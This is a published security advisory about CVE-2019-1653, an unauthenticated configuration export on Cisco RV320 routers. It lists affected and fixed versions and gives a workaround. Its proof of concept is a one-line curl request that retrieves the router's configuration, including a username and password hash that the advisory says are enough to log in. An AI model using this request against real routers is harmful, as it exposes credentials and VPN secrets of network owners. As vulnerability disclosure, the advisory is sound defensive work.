Subject: [RT-SA-2018-002] Cisco RV320 Unauthenticated Configuration Export

Advisory: Cisco RV320 Unauthenticated Configuration Export

RedTeam Pentesting discovered that the configuration of a Cisco RV320
router may be exported without authentication through the device's web
interface.


Details
=======

Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15, 1.4.2.17
Fixed Versions: since 1.4.2.19
Vulnerability Type: Information Disclosure
Security Risk: high
Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-002
Advisory Status: published
CVE: CVE-2019-1653
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653


Introduction
============

"Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network."
(from the Cisco RV320 product page [1])


More Details
============

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface. In the device's firmware, this functionality is
implemented using a variety of CGI programs. Access to this web
interface requires prior authentication using a username and password.
RedTeam Pentesting discovered the CGI program:

/cgi-bin/config.exp

This program can be used to export the router's configuration. In
contrast to other functions, this CGI program does not require any form
of authentication. It may be accessed through the router's web server,
which is available from the LAN by default. As described in [2],
firmware versions from 1.4.2 to 1.4.2.15 (including) also expose the web
server to the WAN on TCP port 8007.


Proof of Concept
================

A device's configuration can be retrieved by issuing an HTTP GET request
to the vulnerable CGI program (output shortened):

------------------------------------------------------------------------
$ curl -s http://192.168.1.1/cgi-bin/config.exp
####sysconfig####
[VERSION]
VERSION=73
MODEL=RV320
SSL=0
IPSEC=0
PPTP=0
PLATFORMCODE=RV0XX
[...]
[SYSTEM]
HOSTNAME=router
DOMAINNAME=example.com
DOMAINCHANGE=1
USERNAME=cisco
PASSWD=066bae9070a9a95b3e03019db131cd40
[...]
------------------------------------------------------------------------


Workaround
==========

Prevent untrusted clients from connecting to the device's web server.


Fix
===

Install firmware version 1.4.2.19 (or later) on the router.


Security Risk
=============

This vulnerability is rated as a high risk as it exposes the device's
configuration to untrusted, potentially malicious parties. By
downloading the configuration, attackers can obtain internal network
configuration, VPN or IPsec secrets, as well as password hashes for the
router's user accounts. Knowledge of a user's password hash is
sufficient to log into the router's web interface. Any information
obtained through exploitation of this vulnerability can be used to
facilitate further compromise of the device itself or attached networks.
